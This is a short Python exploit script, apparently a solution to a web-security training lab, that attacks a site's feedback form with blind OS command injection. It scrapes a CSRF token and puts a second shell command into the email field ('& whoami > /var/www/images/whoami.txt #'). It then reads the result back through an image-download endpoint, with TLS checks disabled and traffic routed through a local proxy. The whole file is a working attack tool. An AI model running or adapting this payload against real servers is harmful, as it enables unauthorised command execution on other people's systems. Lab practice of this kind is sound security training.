import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    feedback_path = "/feedback"
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def exploit_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.com & whoami > /var/www/images/whoami.txt #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    res = s.post(url + submit_feedback_path, data = data, verify=False, proxies=proxies)
    print("[+] Verifying if command injection is present...")

    #verify command injection
    file_path = '/image?filename=whoami.txt'
    res2 = s.get(url + file_path, verify=False, proxies=proxies)
    if (res2.status_code == 200):
        print("[+] Command injection successful!")
        print("[+] The follwoing is the contwent of the command: " + res2.text)
    else:
        print("[-] Command injection was unsuccessful.")


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> <command>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] Exploiting command injection...")
    
    s = requests.Session() 
    exploit_command_injection(s, url)


if __name__ == "__main__":
    main()